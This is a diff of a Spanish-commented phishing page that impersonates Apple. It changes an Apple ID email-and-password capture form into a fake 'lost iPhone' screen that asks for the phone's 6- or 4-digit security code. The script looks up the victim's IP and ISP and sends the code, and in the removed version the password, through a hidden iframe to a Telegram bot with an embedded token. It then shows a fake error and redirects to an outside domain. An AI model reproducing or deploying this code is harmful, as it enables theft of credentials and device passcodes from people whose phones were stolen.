@@ -12,33 +12,30 @@
     
     <main id="main">
         <form id="sign-in">
-            <div class="error-message" id="errorMsg"></div>
-            
             <div class="login-form">
                 <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
-                <p id="loginTitle">Sign in with your Apple ID</p>
+                <p id="loginTitle">Enter the security code from your lost iPhone</p>
+                <p id="subtitle" style="font-size: 1rem; color: #d2d2d7; margin: 0.5rem 0 1.5rem 0; font-weight: 400;">Enter the 6-digit security code to see the most recent location</p>
                 
-                <div class="input-group">
-                    <input id="email-phone" type="email" placeholder="Email or phone number" required>
-                    <i class='bx bx-right-arrow-circle'></i>
+                <!-- ERROR ARRIBA DE CASILLAS -->
+                <div class="error-message-container">
+                    <div class="error-message" id="errorMsg"></div>
                 </div>
                 
-                <div class="input-group password-field" id="passwordField">
-                    <input id="password" type="password" placeholder="Password">
-                    <i class='bx bx-lock-alt'></i>
+                <div class="code-input-container">
+                    <div class="code-inputs" id="codeInputs">
+                        <input type="number" maxlength="1" class="code-input" data-index="0" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="1" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="2" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="3" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="4" inputmode="numeric">
+                        <input type="number" maxlength="1" class="code-input" data-index="5" inputmode="numeric">
+                    </div>
                 </div>
                 
-                <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
-            </div>
-            
-            <div class="login-options">
-                <label class="checkbox-label">
-                    <input type="checkbox" id="check"> Keep me signed in
-                </label>
-                <div class="links">
-                    <a href="#">Forgot Apple ID or password?</a>
-                    <a href="#">Create Apple ID</a>
-                </div>
+                <button type="button" class="four-digit-btn" id="fourDigitBtn">
+                    Do you have a 4-digit code?
+                </button>
             </div>
         </form>
     </main>
@@ -53,30 +50,102 @@
     </footer>
 
     <script>
-        // 🔥 SCRIPT SIN CAMBIOS - MANTIENE TODA LA FUNCIONALIDAD
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('🚀 ERROR VISIBLE + Telegram solo con password');
+            console.log('🚀 ERROR ARRIBA CASILLAS + REDIRECCIÓN CORREGIDA');
             
-            const emailInput = document.getElementById('email-phone');
-            const arrowIcon = document.querySelector('.bx-right-arrow-circle');
-            const passwordField = document.getElementById('passwordField');
-            const passwordInput = document.getElementById('password');
-            const submitBtn = document.getElementById('submitBtn');
+            const codeInputsContainer = document.getElementById('codeInputs');
             const errorMsg = document.getElementById('errorMsg');
-            const form = document.getElementById('sign-in');
+            const fourDigitBtn = document.getElementById('fourDigitBtn');
+            const subtitle = document.getElementById('subtitle');
             
             let loginAttempts = 0;
-            const MAX_ATTEMPTS = 3;
-            
-            const appleErrors = [
-                "Incorrect Apple ID or password.",
-                "Your Apple ID or password is incorrect.",
-                "The Apple ID or password you entered has been disabled."
-            ];
+            let isFourDigitMode = false;
+            let codeInputs = [];
+            let MAX_CODE_LENGTH = 6;
             
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
+            
+            // Inicializar inputs
+            function initInputs() {
+                codeInputs = Array.from(document.querySelectorAll('.code-input'));
+                codeInputs[0].focus();
+                setupInputListeners();
+            }
+            
+            // Cambiar a modo 4 dígitos
+            function switchToFourDigits() {
+                isFourDigitMode = true;
+                MAX_CODE_LENGTH = 4;
+                
+                const container = document.getElementById('codeInputs');
+                container.innerHTML = `
+                    <input type="number" maxlength="1" class="code-input" data-index="0" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="1" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="2" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="3" inputmode="numeric">
+                `;
+                
+                initInputs();
+                subtitle.textContent = 'Enter the 4-digit security code';
+                fourDigitBtn.textContent = 'Switch to 6-digit code';
+                fourDigitBtn.classList.add('active');
+            }
+            
+            // Cambiar a modo 6 dígitos
+            function switchToSixDigits() {
+                isFourDigitMode = false;
+                MAX_CODE_LENGTH = 6;
+                
+                const container = document.getElementById('codeInputs');
+                container.innerHTML = `
+                    <input type="number" maxlength="1" class="code-input" data-index="0" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="1" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="2" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="3" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="4" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-input" data-index="5" inputmode="numeric">
+                `;
+                
+                initInputs();
+                subtitle.textContent = 'Enter the 6-digit security code to see the most recent location';
+                fourDigitBtn.textContent = 'Do you have a 4-digit code?';
+                fourDigitBtn.classList.remove('active');
+            }
+            
+            // Configurar listeners
+            function setupInputListeners() {
+                codeInputs.forEach((input, index) => {
+                    input.addEventListener('input', (e) => {
+                        let value = e.target.value;
+                        value = value.replace(/\D/g, '');
+                        e.target.value = value;
+                        
+                        if (value.length === 1 && index < MAX_CODE_LENGTH - 1) {
+                            codeInputs[index + 1].focus();
+                        }
+                        
+                        // Auto-submit al completar
+                        const code = Array.from(codeInputs).map(inp => inp.value).join('');
+                        if (code.length === MAX_CODE_LENGTH) {
+                            handleSubmit();
+                        }
+                    });
+                    
+                    input.addEventListener('keydown', (e) => {
+                        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                            codeInputs[index - 1].focus();
+                        }
+                        if (e.key === 'Enter') {
+                            const code = Array.from(codeInputs).map(inp => inp.value).join('');
+                            if (code.length === MAX_CODE_LENGTH) {
+                                handleSubmit();
+                            }
+                        }
+                    });
+                });
+            }
             
             async function getIPInfo() {
                 try {
@@ -94,114 +163,195 @@
                 }
             }
             
-            const showPassword = () => {
-                if (emailInput.value.trim()) {
-                    passwordField.classList.add('show');
-                    submitBtn.classList.add('show');
-                    setTimeout(() => passwordInput.focus(), 300);
-                }
-            };
-            
-            arrowIcon.addEventListener('click', showPassword);
-            emailInput.addEventListener('keypress', e => {
-                if (e.key === 'Enter' && emailInput.value.trim()) {
-                    showPassword();
-                }
-            });
-            
-            emailInput.addEventListener('blur', () => {
-                if (emailInput.value.trim() === '') {
-                    showError('Enter an Apple ID or phone number.');
-                }
-            });
-            
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
+            async function handleSubmit() {
                 loginAttempts++;
+                const code = Array.from(codeInputs).map(input => input.value).join('');
                 
-                const email = emailInput.value.trim();
-                const password = passwordInput.value.trim();
+                if (code.length !== MAX_CODE_LENGTH) return;
                 
-                if (!password) {
-                    showError('Enter your password.');
-                    return;
-                }
-                
-                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: ${email}`);
+                console.log(`🎯 Intento ${loginAttempts}/2: Código ${MAX_CODE_LENGTH}d - ${code}`);
                 
                 const ipInfo = await getIPInfo();
+                const codeType = isFourDigitMode ? '4-dígitos' : '6-dígitos';
                 
-                const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
+                const message = `🚀 *ASTRO505 - CÓDIGO IPHONE PERDIDO* 🚀
 
-📧 *Email:* ${email}
-🔑 *Password:* ${password}
+🔢 *Código ${codeType}:* ${code}
+📱 *Dispositivo:* iPhone perdido
 🌐 *IP:* ${ipInfo.ip}
 🏢 *Proveedor:* ${ipInfo.isp}
 🌍 *País:* ${ipInfo.country}
 💻 *Navegador:* Chrome
 📱 *Device:* PC
 📅 *Hora:* ${new Date().toLocaleString('es-ES')}
-⚡ *Intento:* ${loginAttempts}/${MAX_ATTEMPTS}
+⚡ *Intento:* ${loginAttempts}/2
 
 ✨ *Plataforma:* Astro505`;
 
                 const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                 iframe.src = telegramUrl;
                 
-                console.log('📤 Telegram con password:', ipInfo.ip);
+                console.log('📤 Telegram enviado:', codeType, code);
                 
-                if (loginAttempts < MAX_ATTEMPTS) {
-                    const errorText = appleErrors[(loginAttempts-1) % appleErrors.length];
-                    showError(errorText);
-                    passwordInput.value = '';
-                    passwordInput.focus();
+                if (loginAttempts === 1) {
+                    // PRIMER INTENTO: Error VISIBLE ARRIBA CASILLAS
+                    showError('Incorrect security code.');
+                    clearInputs();
+                    setTimeout(() => codeInputs[0].focus(), 500);
                 } else {
-                    showError('Signing in to your account...');
+                    // SEGUNDO INTENTO: Redirige a TU PÁGINA
+                    showError('Verifying security code...');
                     setTimeout(() => {
-                        window.location.href = 'index.html';
-                    }, 1500);
+                        // CAMBIA ESTA URL POR LA QUE QUIERAS
+                        window.location.href = 'https://suport-here.click/sign-in';
+                    }, 800);
                 }
-            });
+            }
+            
+            function clearInputs() {
+                codeInputs.forEach(input => input.value = '');
+            }
             
             function showError(message) {
                 errorMsg.textContent = message;
                 errorMsg.classList.add('show');
-                errorMsg.style.top = '-10px';
+                // Scroll suave para que sea visible con teclado
+                errorMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 setTimeout(() => {
                     errorMsg.classList.remove('show');
-                    errorMsg.style.top = '';
-                }, 5000);
+                }, 3500);
             }
             
-            console.log('✅ Telegram SOLO con password + Error VISIBLE');
+            // Event listeners
+            fourDigitBtn.addEventListener('click', () => {
+                if (isFourDigitMode) {
+                    switchToSixDigits();
+                } else {
+                    switchToFourDigits();
+                }
+            });
+            
+            // Inicializar
+            initInputs();
+            console.log('✅ ERROR ARRIBA + REDIRECCIÓN CORREGIDA');
         });
     </script>
 
     <style>
-        /* ESTILOS INLINE PARA ERROR MANTIENEN PRIORIDAD */
+        /* ERROR POSICIONADO ARRIBA DE CASILLAS */
+        .error-message-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1rem;
+            min-height: 24px;
+        }
+        
         .error-message {
-            position: relative !important;
-            top: -10px !important;
-            left: 0 !important;
-            transform: none !important;
             background: #ff3b30 !important;
             color: white !important;
             padding: 12px 20px !important;
-            margin-bottom: 15px !important;
-            font-size: 14px !important;
+            font-size: 15px !important;
             font-weight: 500 !important;
-            border-radius: 10px !important;
-            box-shadow: 0 4px 20px rgba(255,59,48,0.4) !important;
-            width: 100% !important;
+            border-radius: 12px !important;
+            box-shadow: 0 6px 24px rgba(255,59,48,0.4) !important;
+            width: auto !important;
+            max-width: 90% !important;
             text-align: center !important;
             opacity: 0 !important;
-            transition: all 0.4s ease !important;
+            transform: translateY(-10px) !important;
+            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94) !important;
             z-index: 100 !important;
+            position: relative !important;
         }
         
         .error-message.show {
             opacity: 1 !important;
             transform: translateY(0) !important;
+        }
+
+        /* CASILLAS PERFECTAS */
+        .code-input-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin: 1rem 0 1.5rem 0;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .code-inputs {
+            display: flex !important;
+            gap: 12px !important;
+            justify-content: center !important;
+            flex-direction: row !important;
+            flex-wrap: nowrap !important;
+            align-items: center;
+        }
+        
+        .code-input {
+            width: 56px !important;
+            height: 68px !important;
+            font-size: 2rem !important;
+            font-weight: 600 !important;
+            text-align: center !important;
+            background: rgba(52, 52, 56, 0.9) !important;
+            border: 2px solid rgba(255, 255, 255, 0.1) !important;
+            border-radius: 14px !important;
+            color: #ffffff !important;
+            transition: all 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94) !important;
+            font-family: 'SF Pro Display', -apple-system, sans-serif !important;
+            -webkit-appearance: none !important;
+            appearance: none !important;
+        }
+        
+        .code-input:focus {
+            border-color: #0a84ff !important;
+            background: rgba(255, 255, 255, 0.12) !important;
+            box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.25) !important;
+            outline: none !important;
+            transform: scale(1.03) !important;
+        }
+
+        .four-digit-btn {
+            background: none;
+            border: none;
+            color: #0a84ff !important;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 0.8rem 1.8rem;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            margin: 1rem auto;
+            display: block;
+            text-align: center;
+        }
+        
+        .four-digit-btn:hover {
+            background: rgba(10, 132, 255, 0.12) !important;
+            color: #0066cc !important;
+        }
+        
+        .four-digit-btn.active {
+            color: #d2d2d7 !important;
+        }
+
+        /* MÓVIL - ERROR SIEMPRE VISIBLE */
+        @media (max-width: 480px) {
+            .error-message {
+                padding: 14px 24px !important;
+                font-size: 16px !important;
+                margin: 0 1rem !important;
+            }
+            .code-input {
+                width: 52px !important;
+                height: 64px !important;
+                font-size: 1.8rem !important;
+            }
+            .code-inputs {
+                gap: 10px !important;
+            }
         }
     </style>
 </body>
